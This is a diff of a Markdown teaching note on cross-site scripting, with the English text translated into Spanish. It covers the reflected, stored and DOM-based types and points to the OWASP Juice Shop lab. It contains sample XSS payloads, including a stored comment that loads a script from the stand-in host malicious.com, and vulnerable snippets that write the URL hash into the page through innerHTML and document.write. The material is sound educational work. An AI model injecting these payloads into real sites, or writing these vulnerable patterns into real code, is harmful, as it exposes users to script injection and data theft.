@@ -1,52 +1,68 @@
 ## XSS
 
-- Cross-Site Scripting (XSS) vulnerability is a type of computer security vulnerability that allows an 
-attacker to execute malicious code on a user's web page without their knowledge or consent. 
+- Una vulnerabilidad XSS (Cross-Site Scripting) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento.
 
-- This vulnerability enables the attacker to steal personal information, such as usernames, passwords, 
-and other confidential data.
+- Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.
 
-- Essentially, an XSS attack involves inserting malicious code into a vulnerable web page, which is then 
-executed in the browser of the user accessing that page. The malicious code can be anything from scripts 
-that redirect the user to another page to scripts that log keystrokes or form data and send them to a remote server.
+- En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.
 
-There are several types of XSS vulnerabilities, including:
-### Reflected XSS: 
-This type of XSS occurs when user-provided data is reflected in the HTTP response without proper validation. 
-This allows an attacker to inject malicious code into the response, which is then executed in the user's browser.
+Existen varios tipos de vulnerabilidades XSS, incluyendo:
 
-#### Example of Reflected XSS:
+### XSS Reflejado:
+Este tipo de XSS se produce cuando los datos proporcionados por el usuario se reflejan en la respuesta HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
 
-```xml
-<% String eid = request.getParameter("eid"); %>
-...
-Employee ID: <%= eid %>
+#### Ejemplo básico:
 
-```
-In this example, if an attacker sets the "eid" parameter to `<script>alert('XSS')</script>`, it will execute in the victim's browser
+1. URL vulnerable: `http://example.com/search?q=palabra`
+2. Payload: `http://example.com/search?q=<script>alert('XSS')</script>`
+3. Resultado: El script se ejecuta en el navegador del usuario.
 
-### Stored XSS: 
-This type of XSS occurs when an attacker is able to store malicious code in a database or on the web server hosting a vulnerable web page. 
-This code is executed every time the page is loaded.
 
-#### Example of Stored XSS:
 
-```xml
-<p>I highly recommend this product!</p>
+### XSS Almacenado:
+Este tipo de XSS se produce cuando un atacante es capaz de almacenar código malicioso en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
+
+#### Ejemplo básico:
+
+1. Formulario de comentarios vulnerable.
+2. Payload: `<script>alert('XSS Almacenado')</script>`.
+3. Resultado: Cada vez que alguien visualiza el comentario, el script se ejecuta.
+
+#### Ejemplo de XSS Almacenado:
+
+```html
+<p>¡Recomiendo mucho este producto!</p>
 <script src="http://malicious.com/exploit.js"> </script>
 ```
-In this case, the malicious script is stored in the comment section of a retail website and will be executed every time a user views the page
 
-### DOM-Based XSS:
+En este caso, el script malicioso se almacena en la sección de comentarios de un sitio web de comercio electrónico y se ejecutará cada vez que un usuario vea la página.
 
-This type of XSS occurs when malicious code is executed in the user's browser through the Document Object Model (DOM). 
-This happens when JavaScript code on a web page modifies the DOM in a way that is vulnerable to malicious code injection.
 
-#### Example of DOM-Based XSS:
+### XSS Basado en DOM:
+Este tipo de XSS se produce cuando el código malicioso se ejecuta en el navegador del usuario a través del DOM (Modelo de Objetos del Documento). Esto ocurre cuando el código JavaScript en una página web modifica el DOM de una manera vulnerable a la inyección de código malicioso.
 
-```JavaScript
-var name = document.location.hash.substr(1);
-document.write("Hello, " + name);
+#### Ejemplo básico:
+
+1. Código vulnerable:
+
+```javascript
+var userInput = location.hash.substring(1);
+document.getElementById('output').innerHTML = userInput;
 ```
 
-If the URL ends with `#<script>alert('XSS')</script>`, the script will be executed.
+2. URL: `http://example.com/#<script>alert('XSS DOM')</script>`
+3. Resultado: El script se ejecuta al cargar la página.
+
+#### Ejemplo de XSS Basado en DOM:
+
+```javascript
+var name = document.location.hash.substr(1);
+document.write("Hola, " + name);
+```
+
+Si la URL termina con `#<script>alert('XSS')</script>`, el script se ejecutará.
+
+
+### Laboratorio de Práctica:
+
+Para practicar estas vulnerabilidades, el laboratorio utilizando el siguiente proyecto de GitHub: [OWASP Juice Shop](https://github.com/juice-shop/juice-shop).
